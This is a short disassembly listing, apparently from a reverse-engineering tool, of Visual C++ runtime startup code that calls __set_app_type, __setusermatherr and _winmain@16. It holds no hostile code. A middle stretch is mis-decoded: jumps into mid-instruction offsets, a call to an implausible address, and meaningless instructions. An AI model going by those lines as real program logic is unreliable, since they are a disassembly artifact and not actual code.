mov     [ebp-18h], esp
xor     ebx, ebx
mov     [ebp-4], ebx
push    2
call    ds:__set_app_type
pop     ecx
or      dword_42d78c, 0ffffffffh
or      dword_42d790, 0ffffffffh
call    ds:__p__fmode
mov     ecx, dword_42d788
mov     [eax], ecx
call    ds:__p__commode
mov     ecx, dword_42d784
mov     [eax], ecx
mov     eax, ds:_adjust_fdiv
mov     eax, [eax]
mov     dword_42d794, eax
call    nullsub_1
cmp     dword_42cd38, ebx
jnz     short near ptr loc_4036b0+1
push    offset loc_4037b0
call    ds:__setusermatherr
jns     short near ptr loc_403698+2
call    near ptr 684036b7h
or      al, 50h
inc     eax
add     [eax+8], ch
push    eax
inc     eax
add     al, ch
rol     dword ptr [eax], cl
push    eax
jmp     _winmain@16
jmp     ds:_xcptfilter
jmp     ds:_initterm
push    30000h
push    10000h
call    _controlfp
pop     ecx
pop     ecx
retn
xor     eax, eax
retn
mov     eax, offset dword_4042e0
jmp     __cxxframehandler